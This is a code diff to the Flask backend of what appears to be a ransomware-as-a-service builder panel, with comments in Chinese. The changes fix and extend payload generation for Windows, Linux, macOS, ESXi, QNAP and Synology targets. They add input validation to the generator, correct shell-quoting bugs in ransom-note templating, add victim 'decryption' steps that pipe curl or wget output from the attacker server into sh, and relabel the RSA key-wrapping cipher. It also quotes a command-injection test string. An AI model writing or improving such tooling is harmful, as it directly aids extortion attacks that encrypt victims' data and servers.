@@ -417,8 +417,8 @@ def generate():
     if not csrf_ok():
         return jsonify(ok=False, msg='CSRF 校验失败，请刷新页面重试'), 403
     plat = request.form.get('platform','')
-    c2 = request.form.get('c2_url','')
-    sec = request.form.get('secret', app.config['HANDSHAKE_SECRET'])
+    c2 = request.form.get('c2_url','').strip()
+    sec = request.form.get('secret', app.config['HANDSHAKE_SECRET']).strip()
     ransom = {
         'title': request.form.get('ransom_title','YOUR FILES HAVE BEEN ENCRYPTED'),
         'contact': request.form.get('ransom_contact',''),
@@ -429,6 +429,19 @@ def generate():
     # NAS 只加密数据卷，绝不含系统分区
     if plat not in ('win','linux','macos','esxi','qnap','synology'):
         return jsonify(ok=False, msg='无效平台')
+
+    # ── 入参白名单 ──
+    # 此前 Python 侧【完全没有校验】，而 PHP 侧 generate.php 一直有。
+    # 两个后台生成的是同一批模板，等于"换个端口访问就能绕过后台的所有限制"。
+    # 模板里是 C2='{{C2_URL}}' / SECRET='{{HANDSHAKE}}'，不校验就等同于
+    # 把任意代码写进生成的载荷 —— 已实测：secret 传
+    #   x';import os;os.system('id');#
+    # 生成出的 .py 能通过 ast.parse，也就是注入的代码是合法可执行的。
+    if not re.fullmatch(r'https?://[A-Za-z0-9._\-]+(:\d{1,5})?(/[A-Za-z0-9._\-]*)*', c2):
+        return jsonify(ok=False, msg='回连地址格式不合法（需为 http(s)://主机[:端口][/路径]）')
+    # 与 PHP 侧同一条白名单：排除会破坏模板字符串字面量的 ' " ` \ 及空白
+    if not re.fullmatch(r'[A-Za-z0-9_\-@.!$%&*+=]{1,64}', sec):
+        return jsonify(ok=False, msg='握手密钥只能包含字母、数字及 - _ @ . ! $ % & * + = （1-64 位，不能有引号/反斜杠/空格）')
     ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
     # 载荷文件名是载荷可匿名下载时的唯一屏障（时间戳可枚举），
     # 4 字节仅 32 bit 可暴力枚举；提到 16 字节 = 128 bit。
@@ -455,6 +468,18 @@ def generate():
         dec = ('Windows (requires PowerShell 7+)\n'
                f'  curl.exe -sL {srv}/payloads/jasmin_unlock.ps1 -o unlock.ps1\n'
                f'  pwsh -File unlock.ps1 -Server {srv} -K "<passphrase>"')
+    elif plat in ('esxi','qnap','synology'):
+        # 三者都靠 SSH 进设备后用同一个零依赖脚本，但文案要说到点上 ——
+        # 此前一律写成 "Linux / macOS"，等于在勒索信里教受害者用错的方法。
+        _how = {
+            'esxi':     'SSH into the ESXi host (Host > Manage > Services > TSM-SSH)',
+            'qnap':     'first enable SSH: QNAP Control Panel > Network & File Services',
+            'synology': 'first enable SSH: Synology Control Panel > Terminal & SNMP',
+        }[plat]
+        dec = ('NAS / hypervisor host - POSIX shell (pure openssl, no dependencies required)\n'
+               f'  # {_how}\n'
+               f'  curl -sL {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<passphrase>"\n'
+               f'  # if curl is unavailable:  wget -qO- {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<passphrase>"')
     else:
         dec = ('Linux / macOS (pure openssl, no dependencies required)\n'
                f'  curl -sL {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<passphrase>"')
@@ -468,8 +493,11 @@ def generate():
     if ransom['contact']: note += f"\nContact: {ransom['contact']}"
     note += (f"\n\nHow to Decrypt:\n{dec}\n\n"
              "Sha-256 integrity verification guarantees 100% file restoration.")
-    if plat == 'esxi':
-        # sh 单引号字符串中用 '\'' 转义
+    if plat in ('esxi','qnap','synology'):
+        # 三个平台都是 POSIX sh，模板里的字符串字面量用单引号，转义规则相同。
+        # 此前只判了 esxi，qnap/synology 掉进下面的 Python 分支用 \' 转义 ——
+        # 在 sh 单引号里那不是转义，引号照样提前收尾。已实测：qnap 载荷配
+        # 含单引号的勒索信，sh -n 直接 rc=2 语法错误。
         tpl = tpl.replace('{{RANSOM_NOTE}}', note.replace("'","'\\''"))
         for k,v in ransom.items():
             tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', v.replace("'","'\\''"))
@@ -588,9 +616,12 @@ def keygen():
     key = rsa_gen.generate_private_key(65537, 2048, default_backend())
     priv = key.private_bytes(ser.Encoding.PEM, ser.PrivateFormat.TraditionalOpenSSL, ser.NoEncryption())
     pub = key.public_key().public_bytes(ser.Encoding.PEM, ser.PublicFormat.SubjectPublicKeyInfo)
-    # AES-256-CBC encrypt private key
+    # AES-128-CBC 加密私钥。
+    # 注：此处原注释写的是 "AES-256-CBC / 32 hex = 256 bit"，但 token_hex(16)
+    # 只有 16 字节，实际就是 AES-128 —— 与 PHP 端 keygen.php 一致（那边也注释成 128）。
+    # 注释写错导致解密器把两种格式的标签写反，已一并修正。
     import base64
-    aes_key = secrets.token_hex(16)  # 32 hex = 256 bit
+    aes_key = secrets.token_hex(16)  # 32 hex chars = 16 bytes = AES-128
     iv = secrets.token_bytes(16)
     from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
     cipher = Cipher(algorithms.AES(bytes.fromhex(aes_key)), modes.CBC(iv), default_backend())
@@ -616,7 +647,7 @@ def keygen():
             os.chmod(_p, 0o644)
         except OSError:
             pass
-    return jsonify(ok=True, pub=pub.decode(), msg='RSA-2048 密钥对已生成，私钥已AES-256加密存储')
+    return jsonify(ok=True, pub=pub.decode(), msg='RSA-2048 密钥对已生成，私钥已用 AES-128-CBC 加密存储')
 
 @app.route('/do_update', methods=['POST'])
 @login_required
